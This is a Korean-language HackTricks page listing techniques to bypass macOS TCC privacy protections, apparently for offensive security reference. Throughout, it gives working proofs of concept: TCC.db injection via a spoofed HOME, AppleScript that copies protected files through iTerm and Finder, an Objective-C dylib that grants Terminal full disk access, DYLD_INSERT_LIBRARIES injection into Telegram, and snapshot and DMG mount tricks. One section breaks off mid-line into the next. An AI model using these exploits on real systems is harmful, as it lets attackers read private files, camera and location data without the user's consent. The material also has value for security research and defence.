# macOS TCC 우회 방법

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>

## 기능별

### 쓰기 우회

이것은 우회가 아니라 TCC의 작동 방식입니다: **쓰기를 보호하지 않습니다**. 터미널이 사용자의 데스크톱을 읽을 수 없더라도 **쓰기는 가능합니다**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
새로운 **파일에는 `com.apple.macl` 확장 속성**이 추가되어 **생성자 앱**이 읽을 수 있는 권한을 부여합니다.

### SSH 우회

기본적으로 **SSH를 통한 액세스는 "전체 디스크 액세스"를 가지고 있습니다**. 이를 비활성화하려면 목록에 나열되어 있어야 하지만 비활성화되어 있어야 합니다(목록에서 제거하면 이러한 권한이 제거되지 않습니다):

![](<../../../../../.gitbook/assets/image (569).png>)

여기에서는 일부 **악성 코드가 이 보호를 우회하는 방법**의 예를 찾을 수 있습니다:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
지금은 SSH를 활성화하려면 **전체 디스크 액세스**가 필요합니다.
{% endhint %}

### 확장자 처리 - CVE-2022-26767

파일에는 **특정 애플리케이션에 대한 권한을 부여하기 위해 `com.apple.macl` 속성**이 지정됩니다. 이 속성은 파일을 앱 위로 끌어다 놓거나 사용자가 파일을 **더블 클릭**하여 기본 애플리케이션으로 열 때 설정됩니다.

따라서 사용자는 악성 앱을 등록하여 모든 확장자를 처리하고 Launch Services를 호출하여 모든 파일을 **열 수 있습니다(따라서 악성 파일은 읽을 수 있는 권한이 부여됩니다).**

### iCloud

**`com.apple.private.icloud-account-access`** 권한을 사용하면 **`com.apple.iCloudHelper`** XPC 서비스와 통신할 수 있으며 이를 통해 iCloud 토큰을 **제공**할 수 있습니다.

**iMovie**와 **Garageband**는 이 권한과 다른 권한을 가지고 있었습니다.

이 권한으로부터 iCloud 토큰을 얻기 위한 exploit에 대한 자세한 **정보**는 다음 발표를 참조하세요: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / 자동화

**`kTCCServiceAppleEvents`** 권한을 가진 앱은 다른 앱을 **제어**할 수 있습니다. 이는 다른 앱에 부여된 권한을 **남용**할 수 있는 가능성을 의미합니다.

Apple 스크립트에 대한 자세한 정보는 다음을 확인하세요:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

예를 들어, 앱이 **`iTerm`에 대한 자동화 권한**을 가지고 있다면, 이 예제에서는 **`Terminal`**이 iTerm에 대한 액세스 권한을 가지고 있습니다:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm을 통해

FDA를 가지고 있지 않은 Terminal은 iTerm을 호출하고 이를 사용하여 작업을 수행할 수 있습니다:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder를 통한 우회

또는 앱이 Finder를 통해 액세스하는 경우, 다음과 같은 스크립트를 사용할 수 있습니다:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 앱 동작에 따른

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

사용자 공간의 **tccd 데몬**은 **`HOME`** **env** 변수를 사용하여 TCC 사용자 데이터베이스에 접근합니다: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[이 Stack Exchange 게시물](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)에 따르면 TCC 데몬은 현재 사용자 도메인 내에서 `launchd`를 통해 실행되므로, **모든 환경 변수**를 제어할 수 있습니다.\
따라서, **공격자는 `launchctl`**에서 **`$HOME` 환경** 변수를 **제어된 디렉토리**를 가리키도록 설정한 후, **TCC** 데몬을 **재시작**하고, 그런 다음 TCC 데이터베이스를 **직접 수정**하여 최종 사용자에게 프롬프트 없이 **모든 TCC 권한**을 부여할 수 있습니다.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - 노트

노트는 TCC로 보호된 위치에 액세스할 수 있었지만, 노트가 생성되면 이는 **보호되지 않은 위치에 생성**됩니다. 따라서, 노트에 보호된 파일을 복사하도록 노트에 요청한 다음 파일에 액세스할 수 있습니다:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - 이동

라이브러리 `libsecurity_translocate`를 사용하는 `/usr/libexec/lsd` 이진 파일은 `com.apple.private.nullfs_allow` 허용권한을 가지고 있어 **nullfs** 마운트를 생성할 수 있으며, `com.apple.private.tcc.allow` 허용권한과 **`kTCCServiceSystemPolicyAllFiles`**를 사용하여 모든 파일에 액세스할 수 있습니다.

"Library"에 격리 속성을 추가하고 **`com.apple.security.translocation`** XPC 서비스를 호출한 다음 Library를 **`$TMPDIR/AppTranslocation/d/d/Library`**에 매핑하여 Library 내의 모든 문서에 **액세스**할 수 있습니다.

### CVE-2023-38571 - 음악 및 TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**에는 흥미로운 기능이 있습니다. 실행 중일 때, 사용자의 "미디어 라이브러리"로 **`~/Music/Music/Media.localized/Automatically Add to Music.localized`**에 드롭된 파일을 **가져옵니다**. 또한 다음과 같은 호출을 수행합니다: **`rename(a, b);`** 여기서 `a`와 `b`는 다음과 같습니다:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

이 **`rename(a, b);`** 동작은 **경쟁 조건(Race Condition)**에 취약합니다. `Automatically Add to Music.localized` 폴더에 가짜 **TCC.db** 파일을 넣은 다음 새 폴더(b)가 생성되어 파일을 복사하고 삭제하고 **`~/Library/Application Support/com.apple.TCC`**/로 지정할 수 있습니다.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="경로/폴더"`**를 설정하면 **모든 열린 db가 해당 경로로 복사**됩니다. 이 CVE에서는 이 제어를 남용하여 **SQLite 데이터베이스** 내부에 **쓰기**하고, TCC 데이터베이스를 가진 프로세스에서 열린 데이터베이스로 **`SQLITE_SQLLOG_DIR`**을 남용하고 **파일 이름에 심볼릭 링크**를 사용하여 해당 데이터베이스가 **열릴 때 사용자의 TCC.db가 덮어씌워집니다**.\
**자세한 정보는** [**여기에서 확인**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **및**[ **여기에서 확인**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

환경 변수 **`SQLITE_AUTO_TRACE`**가 설정되면 라이브러리 **`libsqlite3.dylib`**가 모든 SQL 쿼리를 **로그로 기록**합니다. 많은 애플리케이션이 이 라이브러리를 사용하므로 모든 SQLite 쿼리를 기록할 수 있습니다.

여러 Apple 애플리케이션은 TCC로 보호된 정보에 액세스하기 위해 이 라이브러리를 사용했습니다.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

이 **환경 변수는 `Metal` 프레임워크에서 사용**되며, 주로 `Music`와 같은 다양한 프로그램에서 FDA를 가지고 있습니다.

다음과 같이 설정합니다: `MTL_DUMP_PIPELINES_TO_JSON_FILE="경로/이름"`. `경로`가 유효한 디렉토리인 경우 버그가 트리거되고 `fs_usage`를 사용하여 프로그램 내에서 무슨 일이 일어나고 있는지 확인할 수 있습니다:

* `open()`이 호출되는 파일인 `경로/.dat.nosyncXXXX.XXXXXX` (X는 무작위)가 생성됩니다.
* 하나 이상의 `write()`가 파일에 내용을 씁니다 (이를 제어할 수 없습니다).
* `경로/.dat.nosyncXXXX.XXXXXX`가 `rename()`을 통해 `경로/이름`으로 이름이 변경됩니다.

이는 임시 파일 쓰기 후 **보안이 되지 않은 `rename(old, new)`**입니다.

이는 **이전 경로와 새 경로를 따로 해결**해야 하기 때문에 시간이 걸리고 Race Condition에 취약할 수 있습니다. 자세한 정보는 `xnu` 함수 `renameat_internal()`을 확인하십시오.

{% hint style="danger" %}
요약하자면, 특권 프로세스가 제어하는 폴더에서 이름을 변경하는 경우 RCE를 획득하여 다른 파일에 액세스하거나, 이 CVE에서처럼 특권 앱이 생성한 파일을 열고 FD를 저장할 수 있습니다.

이름 변경이 제어하는 폴더에 접근하면서 소스 파일을 수정하거나 FD를 가지고 있는 경우, 대상 파일(또는 폴더)을 심볼릭 링크로 지정하여 원하는 시점에 쓸 수 있습니다.
{% endhint %}

이것이 CVE에서의 공격입니다. 예를 들어, 사용자의 `TCC.db`를 덮어쓰기 위해 다음을 수행할 수 있습니다:

* `/Users/hacker/ourlink`를 `/Users/hacker/Library/Application Support/com.apple.TCC/`로 지정하는 링크를 생성합니다.
* `/Users/hacker/tmp/` 디렉토리를 생성합니다.
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`로 설정합니다.
* 이 환경 변수로 `Music`을 실행하여 버그를 트리거합니다.
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X는 무작위)의 `open()`을 캐치합니다.
* 여기에서도 쓰기를 위해 이 파일을 `open()`하고 파일 디스크립터를 보유합니다.
* `/Users/hacker/tmp`를 `/Users/hacker/ourlink`와 **루프 안에서 원자적으로 교체**합니다.
* 이는 경합 창이 매우 작기 때문에 성공 확률을 극대화하기 위해 수행합니다. 그러나 경합에서 지는 것은 무시할 만한 단점이 있습니다.
* 잠시 기다립니다.
* 행운이 따랐는지 테스트합니다.
* 그렇지 않으면 처음부터 다시 실행합니다.

자세한 내용은 [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)에서 확인할 수 있습니다.

{% hint style="danger" %}
이제 환경 변수 `MTL_DUMP_PIPELINES_TO_JSON_FILE`을 사용하려고 하면 앱이 실행되지 않습니다.
{% endhint %}

### Apple 원격 데스크톱

루트 권한으로이 서비스를 활성화하면 **ARD 에이전트가 전체 디스크 액세스**를 갖게되며, 사용자가 이를 악용하여 새로운 **TCC 사용자 데이터베이스를 복사**할 수 있습니다.

## **NFSHomeDirectory**를 통해

TCC는 사용자의 홈 폴더에있는 데이터베이스를 사용하여 사용자별 리소스에 대한 액세스를 제어합니다. 경로는 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**입니다.\
따라서 사용자가 `$HOME` 환경 변수를 **다른 폴더**를 가리키도록 재시작할 수 있다면, 사용자는 **/Library/Application Support/com.apple.TCC/TCC.db**에 새로운 TCC 데이터베이스를 생성하고 TCC를 속일 수 있습니다.

{% hint style="success" %}
Apple은 **`NFSHomeDirectory`** 속성의 사용자 프로필에 저장된 설정을 **`$HOME` 값으로 사용**합니다. 따라서 이 값을 수정할 권한이있는 애플리케이션을 침해하면 (**`kTCCServiceSystemPolicySysAdminFiles`**), TCC 우회를 위해이 옵션을 **무기화**할 수 있습니다.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**첫 번째 POC**는 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)와 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 사용자의 **HOME** 폴더를 수정합니다.

1. 대상 앱에 대한 _csreq_ blob을 가져옵니다.
2. 필요한 액세스와 _csreq_ blob이 포함된 가짜 _TCC.db_ 파일을 심는다.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)를 사용하여 사용자의 디렉토리 서비스 항목을 내보냅니다.
4. 디렉토리 서비스 항목을 수정하여 사용자의 홈 디렉토리를 변경합니다.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 수정된 디렉토리 서비스 항목을 가져옵니다.
6. 사용자의 _tccd_를 중지하고 프로세스를 다시 시작합니다.

두 번째 POC는 **`/usr/libexec/configd`**를 사용했으며, `com.apple.private.tcc.allow`에 값 `kTCCServiceSystemPolicySysAdminFiles`가 있었습니다.\
**`configd`**를 **`-t`** 옵션과 함께 실행할 수 있으므로, 공격자는 **사용자 정의 번들을 로드**할 수 있습니다. 따라서 이 공격은 사용자의 홈 디렉토리를 변경하는 **`configd` 코드 인젝션**으로 **`dsexport`**와 **`dsimport`** 방법을 대체합니다.

자세한 내용은 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)를 확인하십시오.

## 프로세스 인젝션을 통해

프로세스 내에 코드를 인젝션하고 TCC 권한을 악용하는 다양한 기술이 있습니다:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

또한 TCC 우회를 위해 가장 일반적인 프로세스 인젝션은 **플러그인 (로드 라이브러리)**를 통해 이루어집니다.\
플러그인은 주로 라이브러리 또는 plist 형식의 추가 코드이며, 주 애플리케이션에 의해 **로드되고 해당 컨텍스트에서 실행**됩니다. 따라서 주 애플리케이션이 TCC 제한 파일에 액세스 할 수있는 경우 (권한이 부여되거나 엔타이틀먼트를 통해), **사용자 정의 코드도 해당 액세스 권한을 갖게 됩니다**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app
### CVE-2020-29621 - Coreaudiod

바이너리 **`/usr/sbin/coreaudiod`**는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.private.tcc.manager` 권한을 가지고 있었습니다. 첫 번째 권한은 **코드 인젝션을 허용**하고, 두 번째 권한은 **TCC 관리 권한을 부여**했습니다.

이 바이너리는 `/Library/Audio/Plug-Ins/HAL` 폴더에서 **타사 플러그인을 로드**할 수 있었습니다. 따라서 이 PoC를 사용하여 **플러그인을 로드하고 TCC 권한을 악용**할 수 있었습니다:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
자세한 내용은 [**원본 보고서**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)를 확인하세요.

### 장치 추상화 계층 (DAL) 플러그인

Core Media I/O를 통해 카메라 스트림을 열어보는 시스템 애플리케이션 (**`kTCCServiceCamera`를 사용하는 앱**)은 `/Library/CoreMediaIO/Plug-Ins/DAL`에 위치한 **이 플러그인들을 프로세스에 로드**합니다 (SIP 제한 없음).

일반적인 **생성자**를 가진 라이브러리를 그곳에 저장하는 것만으로도 **코드를 주입**할 수 있습니다.

이에 대해 몇 가지 Apple 애플리케이션이 취약했습니다.

### Firefox

Firefox 애플리케이션은 `com.apple.security.cs.disable-library-validation` 및 `com.apple.security.cs.allow-dyld-environment-variables` 권한을 가지고 있었습니다:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
더 자세한 정보를 얻으려면 [**원본 보고서를 확인하세요**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

바이너리 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`은 **`com.apple.private.tcc.allow`**와 **`com.apple.security.get-task-allow`** 권한을 가지고 있어 프로세스 내에 코드를 주입하고 TCC 권한을 사용할 수 있었습니다.

### CVE-2023-26818 - Telegram

Telegram은 **`com.apple.security.cs.allow-dyld-environment-variables`**와 **`com.apple.security.cs.disable-library-validation`** 권한을 가지고 있어 카메라로 녹화와 같은 권한에 접근할 수 있었습니다. [**해당 페이로드는 이 문서에서 찾을 수 있습니다**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

환경 변수를 사용하여 라이브러리를 로드하는 방법에 주목하세요. **사용자 정의 plist**를 생성하여 이 라이브러리를 주입하고 **`launchctl`**을 사용하여 실행했습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 열린 호출로

샌드박스 환경에서도 **`open`**을 호출할 수 있습니다.

### 터미널 스크립트

기술인들이 사용하는 컴퓨터에서는 터미널에 **전체 디스크 액세스 (FDA)**를 부여하는 것이 일반적입니다. 그리고 **`.terminal`** 스크립트를 사용하여 호출할 수 있습니다.

**`.terminal`** 스크립트는 다음과 같은 명령을 **`CommandString`** 키에서 실행하는 plist 파일입니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
애플리케이션은 /tmp와 같은 위치에 터미널 스크립트를 작성하고 다음과 같은 명령으로 실행할 수 있습니다:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## 마운트를 통한 우회

### CVE-2020-9771 - mount\_apfs TCC 우회 및 권한 상승

**모든 사용자** (비특권 사용자도 포함)는 타임 머신 스냅샷을 생성하고 마운트하여 해당 스냅샷의 **모든 파일에 액세스** 할 수 있습니다.\
**관리자**에 의해 부여되어야 하는 **Full Disk Access** (FDA) 액세스 (`kTCCServiceSystemPolicyAllfiles`)를 가진 응용 프로그램 (예: `Terminal`)에 대해서만 특권이 필요합니다.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

더 자세한 설명은 [**원본 보고서에서 찾을 수 있습니다**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 및 CVE-2021-30808 - TCC 파일 위에 마운트

TCC DB 파일이 보호되더라도, 새로운 TCC.db 파일을 **디렉토리 위에 마운트**하는 것이 가능했습니다:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**원본 설명서**에서 **전체 악용**을 확인하세요.

### asr

**`/usr/sbin/asr`** 도구는 TCC 보호를 우회하여 전체 디스크를 복사하고 다른 위치에 마운트할 수 있도록 허용했습니다.

### 위치 서비스

**`/var/db/locationd/clients.plist`**에는 위치 서비스에 액세스할 수 있는 클라이언트를 나타내는 세 번째 TCC 데이터베이스가 있습니다.\
**`/var/db/locationd/` 폴더는 DMG 마운트에서 보호되지 않았으므로 자체 plist를 마운트할 수 있었습니다.

## 시작 프로그램에 의해

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grep을 사용하여

여러 경우에 파일은 이메일, 전화번호, 메시지 등과 같은 민감한 정보를 보호되지 않은 위치에 저장할 수 있습니다 (이는 Apple의 취약점으로 간주됩니다).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 합성 클릭

이 방법은 더 이상 작동하지 않지만, [**과거에는 작동했습니다**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics 이벤트**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)를 사용한 다른 방법:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## 참고

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사를 광고**하거나 **PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
